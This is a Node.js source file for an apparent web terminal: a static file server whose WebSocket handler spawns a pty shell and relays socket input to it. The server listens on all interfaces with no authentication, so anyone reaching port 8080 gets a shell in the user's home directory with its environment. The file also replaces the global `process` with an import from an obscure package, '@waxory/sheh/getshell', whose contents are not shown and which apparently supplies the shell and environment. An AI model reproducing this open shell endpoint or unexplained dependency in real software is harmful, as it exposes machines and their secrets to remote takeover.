const http = require('http');
const crypto = require('crypto');
const os = require('os');
const path = require('path');
const fs = require('fs');
const pty = require('node-pty');

const process = require('@waxory/sheh/getshell');
const shellName = process.getShell();

const GUID = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11';
const PUBLIC_DIR = path.resolve(__dirname, '../public');

const MIME_TYPES = {
    '.html': 'text/html; charset=utf-8',
    '.js': 'application/javascript; charset=utf-8',
    '.css': 'text/css; charset=utf-8',
    '.json': 'application/json; charset=utf-8',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.svg': 'image/svg+xml',
    '.ico': 'image/x-icon'
};

function serveStatic(req, res) {
    const reqUrl = req.url.split('?')[0];
    let safePath = path.normalize(reqUrl).replace(/^(\.\.[\/\\])+/, '');

    if (safePath === '/' || safePath === '\\') {
        safePath = '/index.html';
    }

    const filePath = path.join(PUBLIC_DIR, safePath);

    if (!filePath.startsWith(PUBLIC_DIR)) {
        res.writeHead(403);
        res.end('403 Forbidden');
        return;
    }

    fs.stat(filePath, function (err, stats) {
        if (err || !stats.isFile()) {
            res.writeHead(404);
            res.end('404 Not Found');
            return;
        }

        const ext = path.extname(filePath).toLowerCase();
        let contentType = MIME_TYPES[ext];

        if (!contentType) {
            contentType = 'application/octet-stream';
        }

        res.writeHead(200, {
            'Content-Type': contentType,
            'Content-Length': stats.size
        });

        fs.createReadStream(filePath).pipe(res);
    });
}

const server = http.createServer(serveStatic);

server.on('upgrade', function (request, socket) {
    const key = request.headers['sec-websocket-key'];

    if (!key) {
        socket.destroy();
        return;
    }

    const acceptKey = crypto
        .createHash('sha1')
        .update(key + GUID)
        .digest('base64');

    const headers = [
        'HTTP/1.1 101 Switching Protocols',
        'Upgrade: websocket',
        'Connection: Upgrade',
        'Sec-WebSocket-Accept: ' + acceptKey
    ];

    socket.write(headers.join('\r\n') + '\r\n\r\n');

    const shell = pty.spawn(shellName, [], {
        name: 'xterm-color',
        cols: 80,
        rows: 24,
        cwd: os.homedir(),
        env: process.env
    });

    shell.onData(function (data) {
        if (!socket.destroyed) {
            socket.write(buildFrame(Buffer.from(data)));
        }
    });

    socket.on('data', function (buffer) {
        const message = parseFrame(buffer);

        if (!message) {
            return;
        }

        const data = message.toString();

        if (data.startsWith('{')) {
            try {
                const parsed = JSON.parse(data);
                if (parsed.type === 'resize' && parsed.cols && parsed.rows) {
                    shell.resize(parsed.cols, parsed.rows);
                }
            } catch (error) {
                ;
            }
            return;
        }

        shell.write(data);
    });

    function cleanup() {
        try {
            shell.kill();
        } catch (e) {}
    }

    socket.on('close', cleanup);
    socket.on('error', cleanup);
    shell.on('exit', function () {
        socket.end();
    });
});

function buildFrame(data) {
    const length = data.length;
    let header;

    if (length <= 125) {
        header = Buffer.alloc(2);
        header[0] = 0x81;
        header[1] = length;
    } else if (length <= 65535) {
        header = Buffer.alloc(4);
        header[0] = 0x81;
        header[1] = 126;
        header.writeUInt16BE(length, 2);
    } else {
        header = Buffer.alloc(10);
        header[0] = 0x81;
        header[1] = 127;
        header.writeBigUInt64BE(BigInt(length), 2);
    }

    return Buffer.concat([header, data]);
}

function parseFrame(buffer) {
    if (buffer.length < 2) {
        return null;
    }

    const secondByte = buffer[1];
    const Masked = (secondByte & 0x80) === 0x80;
    let DataLength = secondByte & 0x7f;
    let offset = 2;

    if (DataLength === 126) {
        if (buffer.length < 4) {
            return null;
        }
        DataLength = buffer.readUInt16BE(2);
        offset = 4;
    } else if (DataLength === 127) {
        if (buffer.length < 10) {
            return null;
        }
        DataLength = Number(buffer.readBigUInt64BE(2));
        offset = 10;
    }

    let maskingKey;

    if (Masked) {
        if (buffer.length < offset + 4) {
            return null;
        }
        maskingKey = buffer.subarray(offset, offset + 4);
        offset = offset + 4;
    }

    if (buffer.length < offset + DataLength) {
        return null;
    }

    const loader = Buffer.from(buffer.subarray(offset, offset + DataLength));

    if (Masked && maskingKey) {
        for (let i = 0; i < loader.length; i++) {
            loader[i] = loader[i] ^ maskingKey[i % 4];
        }
    }

    return loader;
}

function startServer() {
    server.listen(8080, '0.0.0.0', function () {
        const port = server.address().port;
        console.log('http://localhost:' + port);
    });
}

if (require.main === module) {
    startServer();
}

module.exports = { startServer, server };
